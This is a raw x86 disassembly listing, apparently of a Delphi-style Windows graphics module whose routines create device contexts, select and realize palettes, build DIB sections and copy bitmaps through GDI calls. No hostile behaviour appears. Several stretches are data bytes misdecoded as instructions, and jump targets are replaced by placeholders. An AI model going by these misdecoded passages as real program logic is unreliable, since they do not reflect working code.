pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4219bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_421964
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_421a05
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4030ac
mov edi eax
mov eax esi
call sub_4030ac
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421b3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_421b22
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407c60
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421b29
mov al 0x1
sub_421b58
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_418c0c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421ba0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421ba7
mov eax [ ebp - 0x4 ]
call sub_403164
retn
sub_421bac
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_421be0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_418c0c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421c2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421c32
mov eax [ ebp - 0x4 ]
call sub_403164
retn
sub_421c5c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ edx + eax * 2 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x640042 ] bh
add [ eax ] al
sbb al 0xe2
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
popad
add [ eax + esi * 2 + 0x51c0041 ] bh
inc edx
add [ eax ] cl
add eax 0x1f240042
inc edx
add [ 0x74694254 ] cl
insd
popad
jo r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4202b8
retn
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_416e84
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421d92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
rcl [ ebp + 0x68 ] 0x92
sbb eax 0xff640042
xor [ ecx + ecx * 4 + 0x20 ] ah
popad
outsb
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421d99
mov eax [ rw-data ]
call sub_416ee8
retn
mov [ ebp - 0x4 ] eax
call sub_416b18
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_42025c
test al al
je r-xdata
jae r-xdata
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_421d6a
push [ fs : eax ]
mov [ fs : eax ] esp
pop esi
retn
rcl al 0x1c
inc edx
add [ edi ] al
or eax 0x74694254
insd
popad
jo r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
clc
add [ ecx + ebx * 2 - 0x77 ] bh
inc ebp
cld
popad
outsb
jbe r-xdata
mov eax [ ebp - 0xc ]
call sub_421e84
xor eax eax
pop edx
rcl [ ebp + 0x68 ] 0x6a
sbb eax 0xff640042
xor [ ecx + ecx * 4 + 0x20 ] ah
jae r-xdata
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
pop eax
push ds
inc edx
add [ eax - 0x57ffbe8f ] ah
jno r-xdata
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
sbb al 0x42
add [ eax + 0x40041e2 ] cl
add [ eax ] cl
inc edi
jb r-xdata
hlt
jo r-xdata
sub_421cf4
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_416e84
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421d92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421d99
mov eax [ rw-data ]
call sub_416ee8
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_421d6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_421e84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4202b8
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_416b18
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_42025c
test al al
je r-xdata
sub_421da0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_416e84
mov esi eax
xor ecx ecx
push ebp
push sub_421e10
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416ee8
retn
mov edx ebx
mov eax esi
call sub_416b18
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_421e84
sub_421e1c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41fe10
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_421e58
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax esi
call sub_421e84
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fed4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_421e84
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_420114
xor edx edx
push ebp
push sub_421f18
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_420440
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_416e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4202b8
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_421f24
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_420114
xor eax eax
push ebp
push sub_422003
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_423240
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_421da0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_423340
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_420440
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_416dfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4202b8
retn
sub_422014
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403164
sub_422034
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_421da0
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40cd4c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_422090
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41e764
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_421da0
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_421da0
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_4220dc
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_420f40
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42218b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_422198
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_4221e4
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_421da0
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_4207ac
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_4207ac
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_422832
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_402734
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_42253c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_420698
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_4207ac
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_4207ac
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_4207ac
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_4207ac
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4227e3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4227d2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4227b0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_4207ac
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_422198
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_402930
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_420f40
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41fcf4
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_4156e4
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41f034
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41fcb8
call sub_41f034
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_420704
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4227b7
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_4207ac
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_422786
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_4207ac
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_402754
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41f034
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41fcb8
call sub_41f034
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41f034
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41fcb8
call sub_41f034
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_4207ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403984
call sub_403984
jmp r-xdata
sub_4227d9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_4227e8
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403900
call sub_403954
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_422848
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_4228ac
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_421da0
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_422aa7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_4207ac
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
